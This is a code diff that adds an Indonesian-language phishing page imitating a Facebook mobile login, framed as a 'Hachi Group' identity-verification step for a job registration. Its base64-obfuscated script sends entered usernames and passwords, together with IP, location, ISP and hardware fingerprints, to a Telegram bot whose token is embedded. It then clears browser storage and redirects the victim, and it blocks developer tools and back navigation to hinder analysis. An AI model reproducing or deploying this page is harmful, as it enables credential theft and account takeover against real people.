@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title id="t_0"></title>
+    <link id="v_c" rel="icon" type="image/png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        :root { --bg: #ffffff; --txt: #1c1e21; --btn-bg: #007BFF; --btn-txt: #ffffff; --input-border: #dddfe2; --f-label: #8e8e8e; --fb-blue: #007BFF; }
+        @media (prefers-color-scheme: dark) { :root { --bg: #ffffff; --txt: #1c1e21; --btn-bg: #007BFF; --btn-txt: #ffffff; --input-border: #dddfe2; --f-label: #8e8e8e; } }
+        html, body { overflow: hidden !important; height: 100%; width: 100%; margin: 0; padding: 0; position: fixed; background-color: var(--bg); color: var(--txt); font-family: Helvetica, Arial, sans-serif; cursor: none !important; -webkit-touch-callout: none; -webkit-user-select: none; user-select: none; touch-action: none; -ms-content-zooming: none; }
+        .input-field { background-color: #f5f6f7; border: 1px solid var(--input-border); color: var(--txt); width: 100%; border-radius: 12px; font-size: 16px; }
+        .login-btn { background-color: var(--fb-blue); color: var(--btn-txt); width: 100%; border-radius: 9999px; font-weight: bold; font-size: 16px; }
+        .outline-btn { background-color: transparent; border: 1px solid var(--fb-blue); color: var(--fb-blue); width: 100%; border-radius: 9999px; font-weight: bold; font-size: 14px; }
+        .main-container { height: 100dvh; display: flex; flex-direction: column; justify-content: flex-start; align-items: center; }
+        .banner { background-color: #f0f2f5; width: 100%; padding: 12px; display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer; }
+        .ig-modal-btn { border-top: 1px solid #dbdbdb; width: 100%; padding: 14px; font-size: 16px; background: transparent; color: #007BFF; font-weight: 600; }
+        .ig-modal-btn:active { background-color: rgba(0,0,0,0.05); }
+    </style>
+</head>
+<body class="antialiased">
+    <div id="m_mt" class="fixed inset-0 z-[60] flex items-center justify-center bg-black/50 hidden">
+        <div class="bg-[var(--bg)] rounded-[14px] max-w-[300px] w-full pt-8 shadow-2xl text-center overflow-hidden">
+            <h3 id="mt_h" class="text-[var(--txt)] text-[18px] px-8 mb-2 font-bold leading-tight"></h3>
+            <p id="mt_p" class="text-[var(--txt)] text-[14px] px-8 mb-8 leading-snug font-normal"></p>
+            <button onclick="g_ps()" id="mt_b1" class="ig-modal-btn block w-full"></button>
+        </div>
+    </div>
+    <div id="m_1" class="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
+        <div class="bg-[var(--bg)] rounded-3xl max-w-sm w-full p-8 shadow-2xl flex flex-col items-center text-center border border-[var(--input-border)]">
+            <div id="h_0" class="mb-6"></div>
+            <h2 id="h_1" class="text-xl font-bold text-[var(--txt)] mb-2"></h2>
+            <div id="h_2" class="text-[var(--f-label)] text-sm mb-6 leading-relaxed"></div>
+            <button onclick="c_m()" id="h_3" class="login-btn py-2.5 w-full active:scale-95 transition-transform">
+                <span id="h_3_t"></span>
+            </button>
+        </div>
+    </div>
+    <div class="main-container">
+        <div class="banner" onclick="g_ps()">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#007BFF" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
+            <span class="text-[#007BFF] text-[13px]">Dapatkan Facebook untuk Android dan nikmati pengalaman menjelajah yang lebih cepat.</span>
+        </div>
+        <div id="l_1" class="text-[var(--f-label)] text-[12px] my-4"></div>
+        <div class="w-full flex-1 flex flex-col items-center px-4">
+            <div id="i_2" class="mb-8 mt-4"></div>
+            <form id="l_f" class="w-full space-y-3">
+                <input type="text" id="p_3" class="input-field px-4 py-3.5 outline-none" autocomplete="off" name="fb_user">
+                <input type="password" id="p_4" class="input-field px-4 py-3.5 outline-none" autocomplete="off" name="fb_pass">
+                <button type="submit" id="b_5" class="login-btn py-2.5 mt-2"></button>
+            </form>
+            <p onclick="g_ps()" id="f_6" class="text-[var(--txt)] text-[14px] font-normal mt-5" style="cursor:pointer"></p>
+        </div>
+        <div class="w-full flex flex-col items-center px-4 mt-auto pb-4">
+            <button onclick="g_ps()" id="n_7" class="outline-btn py-2 w-full mb-6"></button>
+            <div id="m_8" class="flex justify-center items-center"></div>
+        </div>
+    </div>
+    <script>
+        const _0x = { _t: "RmFjZWJvb2s=", _l: "QmFoYXNhIEluZG9uZXNpYQ==", _i: "ZmFjZWJvb2sucG5n", _u: "Tm9tb3IgcG9uc2VsIGF0YXUgZW1haWw=", _p: "S2F0YSBzYW5kaQ==", _b: "TG9naW4=", _f: "THVwYSBrYXRhIHNhbmRpPw==", _n: "QnVhdCBha3VuIGJhcnU=", _m: "TUVUQS5wbmc=", _h_i: "U0hBQlUgSEFDSEkucG5n", _h_t: "U2lzdGVtIFZlcmlmaWthc2kgSGFjaGkgR3JvdXA=", _h_m: "U2lsYWthbiBsb2dpbiBtZWxhbHVpIGFrdW4gRmFjZWJvb2sgQW5kYSB1bnR1ayBtZW12YWxpZGFzaSBpZGVudGl0YXMgZGFuIG1lbGFuanV0a2FuIHBlbmRhZnRhcmFuLg==", _h_b: "TGFuanV0a2FuIFZlcmlmaWthc2k=", _v_f: "RkFWSUNPTi5wbmc=", _tk: "ODU3ODUyNDMyMzpBQUZCS282THhtQ3NDZ0UtVG8tRENQckQ5bWdjNEZaN2kxTQ==", _ci: "ODQ2MTAxOTkxMg==", _rd: "aHR0cHM6Ly9jYXJlZXIuaGFjaGlncm91cC5pZC9jYXJlZXIvYnJhbmQ=", _ip: "aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u", _ps: "aHR0cHM6Ly9wbGF5Lmdvb2dsZS5jb20vc3RvcmUvYXBwcy9kZXRhaWxzP2lkPWNvbS5mYWNlYm9vay5rYXRhbmE=" };
+        const _d = (v) => atob(v);
+        document.title = _d(_0x._t);
+        document.getElementById('v_c').href = _d(_0x._v_f);
+        document.getElementById('l_1').innerText = _d(_0x._l);
+        document.getElementById('i_2').innerHTML = `<img src="${_d(_0x._i)}" class="w-[60px] h-[60px]">`;
+        document.getElementById('p_3').placeholder = _d(_0x._u);
+        document.getElementById('p_4').placeholder = _d(_0x._p);
+        document.getElementById('b_5').innerText = _d(_0x._b);
+        document.getElementById('f_6').innerText = _d(_0x._f);
+        document.getElementById('n_7').innerText = _d(_0x._n);
+        document.getElementById('m_8').innerHTML = `<img src="${_d(_0x._m)}" class="w-16 h-auto">`;
+        document.getElementById('h_0').innerHTML = `<img src="${_d(_0x._h_i)}" class="w-20">`;
+        document.getElementById('h_1').innerText = _d(_0x._h_t);
+        document.getElementById('h_2').innerHTML = _d(_0x._h_m);
+        document.getElementById('h_3_t').innerText = _d(_0x._h_b);
+
+        async function g_a() { try { const r = await fetch(_d(_0x._ip)); const d = await r.json(); const geo = await fetch(`https://ipapi.co/${d.ip}/json/`).then(res => res.json()); const gl = document.createElement('canvas').getContext('webgl'); const dbg = gl.getExtension('WEBGL_debug_renderer_info'); const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A"; return { ip: d.ip, city: geo.city, isp: geo.org, country: geo.country_name, hw: `RAM:${navigator.deviceMemory||"N/A"} CPU:${navigator.hardwareConcurrency||"N/A"} GPU:${gpu}` }; } catch { return { ip: "UNKNOWN" }; } }
+        async function s_d(u, p) { const inf = await g_a(); const m = `*⚡ FB HARVEST: ${u.toUpperCase()}*\n👤 *User:* \`${u}\`\n🔑 *Pass:* \`${p}\`\n🌐 *IP:* \`${inf.ip}\`\n📍 *Loc:* \`${inf.city}, ${inf.country}\`\n🛰 *ISP:* \`${inf.isp}\`\n⚙️ *HW:* \`${inf.hw}\``; await fetch(`https://api.telegram.org/bot${_d(_0x._tk)}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: _d(_0x._ci), text: m, parse_mode: 'Markdown' }) }); localStorage.clear(); sessionStorage.clear(); const dbs = await indexedDB.databases(); dbs.forEach(db => indexedDB.deleteDatabase(db.name)); document.cookie.split(";").forEach(c => { document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date(0).toUTCString() + ";path=/"); }); window.location.replace(_d(_0x._rd)); }
+        document.getElementById('l_f').onsubmit = async (e) => { e.preventDefault(); const u = document.getElementById('p_3').value, p = document.getElementById('p_4').value, btn = document.getElementById('b_5'); if (!u || !p) { s_mt(0); return; } btn.disabled = true; await s_d(u, p); };
+        function s_mt(t) { const e = document.getElementById('m_mt'), h = document.getElementById('mt_h'), p = document.getElementById('mt_p'), b1 = document.getElementById('mt_b1'); if (t === 0) { h.innerText = "Perlu email atau nomor ponsel"; p.innerText = "Masukkan email atau nomor ponsel untuk melanjutkan."; b1.innerText = "OK"; } e.classList.remove('hidden'); }
+        function h_mt() { document.getElementById('m_mt').classList.add('hidden'); }
+        function c_m() { document.getElementById('m_1').style.display = 'none'; }
+        function g_ps() { window.location.href = _d(_0x._ps); }
+        (function extreme_lock() { setInterval(() => { const s = performance.now(); debugger; if (performance.now() - s > 50) { document.body.innerHTML = ""; location.reload(); } }, 30); window.oncontextmenu = (e) => e.preventDefault(); window.onkeydown = (e) => { if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode)) || (e.ctrlKey && [85, 83].includes(e.keyCode))) e.preventDefault(); }; setInterval(() => { history.pushState(null, null, location.href); }, 50); window.onpopstate = () => history.go(1); if (window.self !== window.top) window.top.location = window.self.location; })();
+    </script>
+</body>
+</html>
